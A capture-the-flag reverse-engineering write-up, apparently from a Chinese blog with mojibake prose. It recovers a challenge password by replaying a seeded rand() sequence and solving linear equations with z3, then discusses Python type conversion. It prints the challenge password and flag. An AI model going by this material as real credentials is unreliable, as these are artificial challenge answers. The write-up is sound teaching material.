<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> dword3 = <span class="number">862734414</span>;</span><br><span class="line"><span class="type">int</span> dword1 = <span class="number">1801073242</span>;</span><br><span class="line"><span class="type">int</span> dword2 = <span class="number">829124174</span>;</span><br><span class="line"><span class="type">int</span> dword0 = <span class="number">1869639009</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(dword1 ^ dword2 ^ dword3 ^ dword0);</span><br><span class="line">    <span class="type">int</span> v5 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v6 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v7 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v8 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v9 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v10 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v11 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> v12 = <span class="built_in">rand</span>() % <span class="number">50</span>;</span><br><span class="line">    cout&lt;&lt;v5&lt;&lt;endl&lt;&lt;v6&lt;&lt;endl&lt;&lt;v7&lt;&lt;endl&lt;&lt;v8&lt;&lt;endl&lt;&lt;v9&lt;&lt;endl&lt;&lt;v10&lt;&lt;endl&lt;&lt;v11&lt;&lt;endl&lt;&lt;v12&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/mnt/c/Users/86135/Desktop/reverse]</span><br><span class="line">â””â”€# g++ main.cpp -O0 -o main -m32</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/mnt/c/Users/86135/Desktop/reverse]</span><br><span class="line">â””â”€# ./main</span><br><span class="line">22</span><br><span class="line">39</span><br><span class="line">45</span><br><span class="line">45</span><br><span class="line">35</span><br><span class="line">41</span><br><span class="line">13</span><br><span class="line">36</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢åˆæœ‰å››ä¸ªçº¦æŸæ¡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v4 * v6 + v1 * v5 - v2 - v3 == 0xE638C96D3LL</span><br><span class="line">v4 + v1 + v3 * v8 - v2 * v7 == 0xB59F2D0CBLL</span><br><span class="line">v1 * v9 + v2 * v10 - v3 - v4 == 0xDCFE88C6DLL</span><br><span class="line">v3 * v12 + v1 - v2 - v4 * v11 == 0xC076D98BBLL </span><br></pre></td></tr></table></figure>
<p>ç›®æ ‡æ˜¯è§£å‡ºv1~v4,å¯¹åº”è¾“å…¥çš„åå››ä¸ªåŒå­—</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">v5=<span class="number">22</span></span><br><span class="line">v6=<span class="number">39</span></span><br><span class="line">v7=<span class="number">45</span></span><br><span class="line">v8=<span class="number">45</span></span><br><span class="line">v9=<span class="number">35</span></span><br><span class="line">v10=<span class="number">41</span></span><br><span class="line">v11=<span class="number">13</span></span><br><span class="line">v12=<span class="number">36</span></span><br><span class="line">v1=Int(<span class="string">&#x27;v1&#x27;</span>)</span><br><span class="line">v2=Int(<span class="string">&#x27;v2&#x27;</span>)</span><br><span class="line">v3=Int(<span class="string">&#x27;v3&#x27;</span>)</span><br><span class="line">v4=Int(<span class="string">&#x27;v4&#x27;</span>)</span><br><span class="line">solve(</span><br><span class="line">    v4 * v6 + v1 * v5 - v2 - v3 == <span class="number">0xE638C96D3</span>,</span><br><span class="line">    v4 + v1 + v3 * v8 - v2 * v7 == <span class="number">0xB59F2D0CB</span>,</span><br><span class="line">    v1 * v9 + v2 * v10 - v3 - v4 == <span class="number">0xDCFE88C6D</span>,</span><br><span class="line">    v3 * v12 + v1 - v2 - v4 * v11 == <span class="number">0xC076D98BB</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\reverse&gt; python exp2.py</span><br><span class="line">[v1 = <span class="number">811816014</span>,</span><br><span class="line"> v4 = <span class="number">1195788129</span>,</span><br><span class="line"> v2 = <span class="number">828593230</span>,</span><br><span class="line"> v3 = <span class="number">1867395930</span>]</span><br></pre></td></tr></table></figure>
<p>åˆ°æ­¤è¾“å…¥å…¨éƒ¨è¢«è§£å‡ºäº†,å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> dwords[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">1869639009</span>,</span><br><span class="line">    <span class="number">1801073242</span>,</span><br><span class="line">    <span class="number">829124174</span>,</span><br><span class="line">    <span class="number">862734414</span>,</span><br><span class="line">    <span class="number">811816014</span>,</span><br><span class="line">    <span class="number">828593230</span>,</span><br><span class="line">    <span class="number">1867395930</span>,</span><br><span class="line">    <span class="number">1195788129</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Bitfield</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> bytes[<span class="number">4</span>];</span><br><span class="line">    <span class="type">int</span> aInt;</span><br><span class="line">    Bitfield(<span class="type">const</span> <span class="type">int</span> &amp;x)&#123;</span><br><span class="line">        bytes[<span class="number">0</span>]=(<span class="type">unsigned</span> <span class="type">char</span> )x;</span><br><span class="line">        bytes[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">char</span>)(x&gt;&gt;<span class="number">8</span>);</span><br><span class="line">        bytes[<span class="number">2</span>]=(<span class="type">unsigned</span> <span class="type">char</span>)(x&gt;&gt;<span class="number">16</span>);</span><br><span class="line">        bytes[<span class="number">3</span>]=(<span class="type">unsigned</span> <span class="type">char</span>)(x&gt;&gt;<span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    friend ostream &amp;operator&lt;&lt;(ostream &amp;os,<span class="type">const</span> Bitfield &amp;bf)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)&#123;</span><br><span class="line">            os&lt;&lt;bf.bytes[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;++i)&#123;</span><br><span class="line">        Bitfield <span class="title function_">bf</span><span class="params">(dwords[i])</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;bf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\reverse&gt; g++ main2.cpp -O0 -o main2</span><br><span class="line">PS C:\Users\86135\Desktop\reverse&gt; ./main2</span><br><span class="line">ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG</span><br></pre></td></tr></table></figure>
<p>ç„¶åè¾“å…¥åˆ°ç¨‹åºå°±å¯ä»¥å¾—åˆ°flag</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/mnt/c/Users/86135/Desktop/reverse]</span><br><span class="line">â””â”€# ./mathbad</span><br><span class="line">=======================================</span><br><span class="line">= Welcome to the flag access machine! =</span><br><span class="line">=   Input the password to login ...   =</span><br><span class="line">=======================================</span><br><span class="line">ampoZ2ZkNnk1NHl3NTc0NTc1Z3NoaGFG</span><br><span class="line">Congratulations! You should get the flag...</span><br><span class="line">flag&#123;th3_Line@r_4lgebra_1s_d1fficult!&#125;</span><br></pre></td></tr></table></figure>
<h4 id="å›åˆ°æœ¬é¢˜">å›åˆ°æœ¬é¢˜</h4>
<p>è¦ä½¿ç”¨z3æ¨¡å—è§£ä½“,é¦–å…ˆéœ€è¦æ³¨å†Œå˜é‡,æ¯”å¦‚<code>x=Int("x")</code>è¿™ç§</p>
<p>è€Œç°åœ¨22ä¸ªå˜é‡å¦‚æœæ‰‹åŠ¨æ›´æ¢æˆx,y,zè¿™ç§å­—æ¯,å¤ªæµªè´¹æ—¶é—´,å¤ªæ­»è„‘ç­‹</p>
<p>å¸ˆå‚…ç›´æ¥ç”¨å¾ªç¯æ³¨å†Œäº†ä¸€ä¸ªflagå˜é‡æ•°ç»„</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag = [Int(<span class="string">&quot;input[%d]&quot;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>)]</span><br><span class="line">s = Solver()</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ€ä¹ˆæ·»åŠ çº¦æŸæ¡ä»¶å‘¢?åˆ©ç”¨è¿™ä¸ªand,å†æ¯ä¸ªç­‰å¼å‰é¢å’Œåé¢éƒ½åŠ ä¸Šç‚¹ä¸œè¥¿</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.add(ç­‰å¼)</span><br></pre></td></tr></table></figure>
<p>å°±è¦è¿™ç§å…‰æ ‡æ’å±±å€’æµ·çš„æ•ˆæœ</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110163329271.png"
alt="image-20221110163329271" />
<figcaption aria-hidden="true">image-20221110163329271</figcaption>
</figure>
<p>æŠŠåŸæ¥æœ‰çš„ordå‡½æ•°ä¹Ÿå»æ‰</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">flag=[Int(<span class="string">&quot;flag[%d]&quot;</span>%i)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>)]</span><br><span class="line">s=Solver()</span><br><span class="line">s.add((flag[<span class="number">0</span>]) * <span class="number">7072</span> + (flag[<span class="number">1</span>]) * <span class="number">2523</span> + (flag[<span class="number">2</span>]) * <span class="number">6714</span> + (flag[<span class="number">3</span>]) * <span class="number">8810</span> + (flag[<span class="number">4</span>]) * <span class="number">6796</span> + (flag[<span class="number">5</span>]) * <span class="number">2647</span> + (flag[<span class="number">6</span>]) * <span class="number">1347</span> + (flag[<span class="number">7</span>]) * <span class="number">1289</span> + (flag[<span class="number">8</span>]) * <span class="number">8917</span> + (flag[<span class="number">9</span>]) * <span class="number">2304</span> + (flag[<span class="number">10</span>]) * <span class="number">5001</span> + (flag[<span class="number">11</span>]) * <span class="number">2882</span> + (flag[<span class="number">12</span>]) * <span class="number">7232</span> + (flag[<span class="number">13</span>]) * <span class="number">3192</span> + (flag[<span class="number">14</span>]) * <span class="number">9676</span> + (flag[<span class="number">15</span>]) * <span class="number">5436</span> + (flag[<span class="number">16</span>]) * <span class="number">4407</span> + (flag[<span class="number">17</span>]) * <span class="number">6269</span> + (flag[<span class="number">18</span>]) * <span class="number">9623</span> + (flag[<span class="number">19</span>]) * <span class="number">6230</span> + (flag[<span class="number">20</span>]) * <span class="number">6292</span> + (flag[<span class="number">21</span>]) * <span class="number">57</span> == <span class="number">10743134</span>)</span><br><span class="line">...</span><br><span class="line">s.add((flag[<span class="number">0</span>]) * <span class="number">5926</span> + (flag[<span class="number">1</span>]) * <span class="number">9095</span> + (flag[<span class="number">2</span>]) * <span class="number">2048</span> + (flag[<span class="number">3</span>]) * <span class="number">4639</span> + (flag[<span class="number">4</span>]) * <span class="number">3035</span> + (flag[<span class="number">5</span>]) * <span class="number">9560</span> + (flag[<span class="number">6</span>]) * <span class="number">1591</span> + (flag[<span class="number">7</span>]) * <span class="number">2392</span> + (flag[<span class="number">8</span>]) * <span class="number">1812</span> + (flag[<span class="number">9</span>]) * <span class="number">6732</span> + (flag[<span class="number">10</span>]) * <span class="number">9454</span> + (flag[<span class="number">11</span>]) * <span class="number">8175</span> + (flag[<span class="number">12</span>]) * <span class="number">7346</span> + (flag[<span class="number">13</span>]) * <span class="number">6333</span> + (flag[<span class="number">14</span>]) * <span class="number">9812</span> + (flag[<span class="number">15</span>]) * <span class="number">2034</span> + (flag[<span class="number">16</span>]) * <span class="number">6634</span> + (flag[<span class="number">17</span>]) * <span class="number">1762</span> + (flag[<span class="number">18</span>]) * <span class="number">7058</span> + (flag[<span class="number">19</span>]) * <span class="number">3524</span> + (flag[<span class="number">20</span>]) * <span class="number">7462</span> + (flag[<span class="number">21</span>]) * <span class="number">11</span> == <span class="number">11118093</span>)</span><br><span class="line"><span class="keyword">if</span>(s.check()==sat):</span><br><span class="line">    result = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">22</span>):</span><br><span class="line">        <span class="built_in">print</span>(result[flag[i]])</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å†™å®Œä¹‹å,æœ€ç»ˆæ‰“å°çš„æ˜¯<code>result[flag[i]]</code>,ä¸æ˜¯<code>result[i]</code>,è¿™æ˜¯å› ä¸ºä¸€å¼€å§‹æ˜¯å°†flag[0]æ³¨å†Œä¸ºç¬¬ä¸€ä¸ªå˜é‡,flag[1]æ³¨å†Œä¸ºç¬¬äºŒä¸ªå˜é‡</p>
<p>è¿™æ ·æ‰“å°å‡ºæ¥çš„æ˜¯å­—ç¬¦çš„asciiå€¼,æ€ä¹ˆæ‰èƒ½æ‰“å°å‡ºå­—ç¬¦å‘¢?</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[flag[i]]))),end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>ä¸ºäº†ææ˜ç™½ä¸ºå•¥éœ€è¦è¿™ä¹ˆå¤šç±»å‹è½¬æ¢,æ€»ç»“ä¸€ä¸‹pythonä¸­int,byte,char,strä¹‹é—´çš„è½¬æ¢å‡½æ•°</p>
<h4 id="pythonä¸­çš„ç±»å‹è½¬æ¢">pythonä¸­çš„ç±»å‹è½¬æ¢</h4>
<table>
<colgroup>
<col style="width: 30%" />
<col style="width: 69%" />
</colgroup>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>int(x [,base ])</td>
<td>å°†å­—ç¬¦ä¸²xè½¬æ¢ä¸ºâ¼€ä¸ªæ•´æ•°</td>
</tr>
<tr>
<td>float(x )</td>
<td>å°†å­—ç¬¦ä¸²xè½¬æ¢ä¸ºâ¼€ä¸ªæµ®ç‚¹æ•°</td>
</tr>
<tr>
<td>complex(real [,imag ])</td>
<td>åˆ›å»ºâ¼€ä¸ªå¤æ•°ï¼Œrealä¸ºå®éƒ¨ï¼Œimagä¸ºè™šéƒ¨</td>
</tr>
<tr>
<td>str(x )</td>
<td>å°†å¯¹è±¡ x è½¬æ¢ä¸ºå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>repr(x )</td>
<td>å°†å¯¹è±¡ x è½¬æ¢ä¸ºè¡¨è¾¾å¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>eval(str )</td>
<td>â½¤æ¥è®¡ç®—åœ¨å­—ç¬¦ä¸²ä¸­çš„æœ‰æ•ˆPythonè¡¨è¾¾å¼,å¹¶è¿”å›â¼€ä¸ªå¯¹è±¡</td>
</tr>
<tr>
<td>tuple(s )</td>
<td>å°†åºåˆ— s è½¬æ¢ä¸ºâ¼€ä¸ªå…ƒç»„</td>
</tr>
<tr>
<td>list(s )</td>
<td>å°†åºåˆ— s è½¬æ¢ä¸ºâ¼€ä¸ªåˆ—è¡¨</td>
</tr>
<tr>
<td>chr(x )</td>
<td>å°†â¼€ä¸ªæ•´æ•°è½¬æ¢ä¸ºâ¼€ä¸ªUnicodeå­—ç¬¦</td>
</tr>
<tr>
<td>ord(x )</td>
<td>å°†â¼€ä¸ªå­—ç¬¦è½¬æ¢ä¸ºå®ƒçš„ASCIIæ•´æ•°å€¼</td>
</tr>
<tr>
<td>hex(x )</td>
<td>å°†â¼€ä¸ªæ•´æ•°è½¬æ¢ä¸ºâ¼€ä¸ªâ¼—å…­è¿›åˆ¶<strong>å­—ç¬¦ä¸²</strong></td>
</tr>
<tr>
<td>oct(x )</td>
<td>å°†â¼€ä¸ªæ•´æ•°è½¬æ¢ä¸ºâ¼€ä¸ªâ¼‹è¿›åˆ¶å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>bin(x )</td>
<td>å°†â¼€ä¸ªæ•´æ•°è½¬æ¢ä¸ºâ¼€ä¸ªâ¼†è¿›åˆ¶å­—ç¬¦ä¸²</td>
</tr>
</tbody>
</table>
<p>å¯¹äº<code>int(str,[,base])</code>,baseé€šè¿‡ä¸€ä¸ªæ•´æ•°å€¼æŒ‡å®šå°†strç†è§£ä¸º10è¿›åˆ¶æˆ–è€…16è¿›åˆ¶çš„å­—é¢é‡è¿›è¡Œè½¬æ¢</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&quot;10&quot;</span>,<span class="number">10</span>)</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&quot;0x10&quot;</span>,<span class="number">10</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ValueError: invalid literal <span class="keyword">for</span> <span class="built_in">int</span>() <span class="keyword">with</span> base <span class="number">10</span>: <span class="string">&#x27;0x10&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&quot;0x10&quot;</span>,<span class="number">16</span>)</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœstr="0x10"å¸¦äº†0xå‰ç¼€,æ­¤æ—¶base=16å¯ä»¥å°†strè½¬æ¢ä¸º16è¿›åˆ¶æ•´æ•°,ä½†æ˜¯å°è¯•è½¬æ¢ä¸º10è¿›åˆ¶å°±ä¼šå‡ºé”™</p>
<p>ä½†æ˜¯å¦‚æœstr="0x10"åˆ™æ—¢å¯ä»¥è¯†åˆ«ä¸º10è¿›åˆ¶,ä¹Ÿå¯ä»¥è¯†åˆ«ä¸º16è¿›åˆ¶</p>
<p>å›è¿‡å¤´æ¥ç†è§£<code>print(chr(int(str(m[flag[i]]))),end = '')</code></p>
<p>è¿™æ ·å†™é¦–å…ˆå°†ä¸€ä¸ªæ•´æ•°è½¬ä¸ºstrç„¶ååˆè½¬ä¸ºint,çœ‹ä¼¼æ˜¯è½¬äº†ä¸ªå¯‚å¯,å…¶å®ä¸€ä¸ªå‡½æ•°ä¹Ÿä¸èƒ½å°‘</p>
<p>chræ¥æ”¶ä¸€ä¸ªint,ä½†æ˜¯<code>m[flag[i]]</code>å®é™…ä¸Šæ˜¯Solver.model()çš„è¿”å›å€¼,æ˜¯ä¸€ä¸ªmodelRefå¼•ç”¨.ä¸ºå•¥ä¸æ˜¯æ•´æ•°?å› ä¸ºSolverè¿˜å¯ä»¥æ±‚è§£æµ®ç‚¹æ•°æ–¹ç¨‹ç»„.å› æ­¤éœ€è¦å¯¹modelRefä¸èƒ½ç›´æ¥ä¸¢ç»™chr</p>
<p>å¹¶ä¸”modelRefä¹Ÿæ²¡æœ‰ç›´æ¥ä¸¢ç»™intå‡½æ•°,è¿™æ˜¯å› ä¸ºintå‡½æ•°åªæ¥å—strä½œä¸ºå‚æ•°,modelRefæ²¡æœ‰åƒstrçš„è‡ªåŠ¨ç±»å‹è½¬æ¢,å› æ­¤é¦–å…ˆéœ€è¦è°ƒç”¨ä¸€ä¸ªstrå‡½æ•°å°†modelRefè½¬ä¸ºå­—ç¬¦ä¸²ç±»å‹</p>
<p>ä¸ºå•¥strå‡½æ•°å¯ä»¥æ¥æ”¶è¿™ä¸ªä¸æ˜¯pythonè‡ªå·±çš„,è€Œæ˜¯æ¥è‡ªå…¶ä»–æ¨¡å—çš„ç±»å‹modelRef?</p>
<p>å› ä¸ºstrçš„å‚æ•°å¯ä»¥æ˜¯ä»»ä½•objå¯¹è±¡,æ˜¾ç„¶modelRefæ˜¯ä¸€ä¸ªå¯¹è±¡,å¯ä»¥è¢«stré€šåƒ</p>
<h4 id="strå¹²äº†å•¥">strå¹²äº†å•¥?</h4>
<p>strå‡½æ•°ä¼šè°ƒç”¨è¯¥ç±»çš„<code>__str__</code>å‡½æ•°,å¦‚æœæ²¡æœ‰æ˜¾å¼å®šä¹‰è¿™ä¸ªå‡½æ•°,åˆ™éšå¼çš„<code>__str__</code>å‡½æ•°ä¼šå°†å¯¹è±¡çš„åœ°å€ä¿¡æ¯è½¬æ¢æˆå­—ç¬¦ä¸²è¿”å›ç»™strå‡½æ•°,ç„¶åstrå†å°†è¿™ä¸ªå€¼è¿”å›ç»™ç”¨æˆ·,æ¯”å¦‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;__main__.A <span class="built_in">object</span> at <span class="number">0x0000026784BF8730</span>&gt;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœæœ‰æ˜¾å¼å®ç°<code>__str__</code>å‡½æ•°,åˆ™strä¼šè·å¾—è¯¥å‡½æ•°çš„è¿”å›å€¼,æ¯”å¦‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">x</span>):</span><br><span class="line">        a=x</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">a=A()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(a))</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·è¿è¡Œç»“æœå°±æ˜¯<code>123</code></p>
<p>å¦‚æœè¿˜é‡è½½äº†<code>__repr__</code>å‡½æ•°,åˆ™strå‡½æ•°é¦–å…ˆè°ƒç”¨æ˜¾å¼çš„<code>__repr__</code>å‡½æ•°è·å¾—è¿”å›å€¼</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    a=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">x</span>):</span><br><span class="line">        a=x</span><br><span class="line">        <span class="comment"># pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;123&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;456&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=A()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(a))</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œç»“æœ:<code>456</code></p>
<p>å› æ­¤å¯ä»¥ä¼°è®¡,Solver.model()å‡½æ•°è¿”å›çš„ä¸œè¥¿,è¦ä¹ˆé‡è½½äº†<code>__str__</code>å‡½æ•°,è¦ä¹ˆé‡è½½äº†<code>__repr__</code>å‡½æ•°</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">model</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> ModelRef(Z3_solver_get_model(<span class="variable language_">self</span>.ctx.ref(), <span class="variable language_">self</span>.solver), <span class="variable language_">self</span>.ctx)</span><br><span class="line">    <span class="keyword">except</span> Z3Exception:</span><br><span class="line">        <span class="keyword">raise</span> Z3Exception(<span class="string">&quot;model is not available&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>å¦‚æœç¨‹åºæ²¡æœ‰é—®é¢˜åˆ™è¿”å›äº†ä¸€ä¸ªModelRefç±»å‹çš„å¯¹è±¡</p>
